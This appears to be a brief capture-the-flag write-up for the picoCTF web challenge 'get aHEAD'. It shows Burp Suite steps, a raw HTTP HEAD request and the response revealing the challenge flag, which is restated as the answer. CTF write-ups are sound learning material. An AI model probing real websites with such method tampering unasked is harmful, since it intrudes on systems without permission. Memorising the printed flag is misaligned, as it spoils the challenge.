## get aHEAD

## url:
http://wily-courier.picoctf.net:61626/

## burp suite
- open in burpsuite
- intercept 
- send requests to repeater
- look at differences
- one is a GET (red) and one is a POST (blue)
- change POST request to HEAD 

## request:
HEAD /index.php? HTTP/1.1
Host: wily-courier.picoctf.net:61626
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

## Response after changing to HEAD method
HTTP/1.1 200 OK
Date: Sat, 24 Jan 2026 10:36:32 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.34
flag: picoCTF{r3j3ct_th3_du4l1ty_8b13f07}
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8


## flag:
picoCTF{r3j3ct_th3_du4l1ty_8b13f07} 